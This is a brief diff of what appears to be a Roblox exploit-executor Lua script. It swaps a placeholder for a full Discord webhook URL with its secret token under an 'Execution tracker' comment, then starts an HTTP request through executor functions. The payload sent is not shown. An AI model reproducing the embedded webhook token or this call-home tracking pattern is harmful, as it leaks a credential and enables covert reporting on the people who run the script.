@@ -5,7 +5,7 @@ local GAMES = {
 }
 
 -- Execution tracker
-local WEBHOOK = "YOUR_WEBHOOK_URL_HERE"
+local WEBHOOK = "https://discord.com/api/webhooks/1484304823250849812/fwWJ0vLCMX0mniIvaMeAPxbflSpTinJ7hGdCQW3XnaXFPm3KcHN7YwtI3F5S52Rx3S10"
 pcall(function()
 	local req = (syn and syn.request) or (http and http.request) or request
 	if not req then return end
